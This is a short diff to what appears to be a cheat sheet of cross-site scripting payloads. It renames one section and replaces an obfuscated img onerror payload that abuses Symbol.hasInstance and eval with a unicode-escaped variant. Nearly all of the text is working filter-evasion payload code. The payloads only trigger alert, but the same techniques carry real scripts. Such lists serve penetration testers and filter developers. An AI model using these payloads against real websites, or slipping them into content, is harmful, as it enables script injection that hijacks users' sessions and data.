@@ -25,8 +25,8 @@ Goodbye!
 <img src onerror="[].filter.constructor('\x61\x6c\x65\x72\x74(1)')()">
 ```
 
-### Indirect function call obfuscation with Symbol.hasInstance abuse and instanceof override
+### Indirect function call obfuscation with Symbol.hasInstance
 
 ```
-<img src=x onerror="([][Symbol.hasInstance]=eval,[]instanceof{[Symbol.hasInstance](){('al'+'ert')(0)}})">
+<img src onerror="([][Symbol.hasInstance]=eval,[]instanceof{[Symbol.hasInstance](){\u0061\u006c\u0065\u0072\u0074(0)}})">
 ```
